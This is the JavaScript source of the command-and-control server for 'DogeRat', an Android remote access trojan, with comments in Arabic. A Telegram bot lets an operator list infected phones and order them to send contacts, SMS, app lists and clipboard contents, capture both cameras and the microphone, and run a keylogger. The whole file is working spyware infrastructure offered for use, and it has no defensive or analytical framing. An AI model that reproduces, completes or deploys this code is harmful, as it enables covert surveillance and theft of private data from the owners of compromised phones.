const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// ========== قراءة الإعدادات ==========
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
    console.error('❌ Failed to read data.json:', error);
    process.exit(1);
}

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

// ========== إعدادات البوت ==========
const bot = new telegramBot(data.token, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// ========== تخزين البيانات ==========
const connectedDevices = new Map();

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

// ========== أوامر البوت ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(data.id, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

bot.onText(/✯ Devices ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '<b>✯ There is no connected device</b>', {
            parse_mode: 'HTML'
        });
        return;
    }

    let message = `<b>✯ Connected devices count: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    const deviceButtons = [];

    for (const [deviceId, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `<b>device</b> → ${device.name}\n`;
        message += `<b>model</b> → ${device.model}\n`;
        message += `<b>ip</b> → ${device.ip}\n`;
        message += `<b>time</b> → ${device.time}\n\n`;
        deviceButtons.push([deviceId]);
        index++;
    }

    deviceButtons.push(['✯ All ✯']);
    deviceButtons.push(['✯ Cancel action ✯']);

    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: deviceButtons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

bot.onText(/✯ All ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>', {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Contacts ✯', '✯ SMS ✯'],
                ['✯ Apps ✯', '✯ Main camera ✯'],
                ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                ['✯ Vibrate ✯', '✯ Toast ✯'],
                ['✯ Clipboard ✯', '✯ Notification ✯'],
                ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== معالجة الأوامر ==========
const handleCommand = (command, msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    const target = appData?.get('currentTarget');
    const deviceId = target || [...connectedDevices.keys()][0];

    if (!deviceId || !connectedDevices.has(deviceId)) {
        bot.sendMessage(data.id, '❌ No device selected or connected');
        return;
    }

    io.to(deviceId).emit('command', { request: command });
    bot.sendMessage(data.id, `📩 ${command} command sent!`);
};

bot.onText(/✯ Contacts ✯/, (msg) => handleCommand('contacts', msg));
bot.onText(/✯ SMS ✯/, (msg) => handleCommand('sms', msg));
bot.onText(/✯ Apps ✯/, (msg) => handleCommand('apps', msg));
bot.onText(/✯ Main camera ✯/, (msg) => handleCommand('main-camera', msg));
bot.onText(/✯ Selfie Camera ✯/, (msg) => handleCommand('selfie-camera', msg));
bot.onText(/✯ Microphone ✯/, (msg) => handleCommand('microphone', msg));
bot.onText(/✯ Vibrate ✯/, (msg) => handleCommand('vibrate', msg));
bot.onText(/✯ Toast ✯/, (msg) => handleCommand('toast', msg));
bot.onText(/✯ Clipboard ✯/, (msg) => handleCommand('clipboard', msg));
bot.onText(/✯ Notification ✯/, (msg) => handleCommand('notification', msg));
bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger-on', msg));
bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger-off', msg));

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);
    
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';

    const deviceInfo = {
        id: socket.id,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    
    connectedDevices.set(socket.id, deviceInfo);
    console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
    
    bot.sendMessage(data.id, `
✅ <b>New device connected</b>

📱 <b>Device:</b> ${deviceName}
📟 <b>Model:</b> ${deviceModel}
🌐 <b>IP:</b> ${deviceIp}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
    `, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            console.log(`❌ Device disconnected: ${device.name}`);
            bot.sendMessage(data.id, `
❌ <b>Device disconnected</b>

📱 <b>Device:</b> ${device.name}
📟 <b>Model:</b> ${device.model}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
});
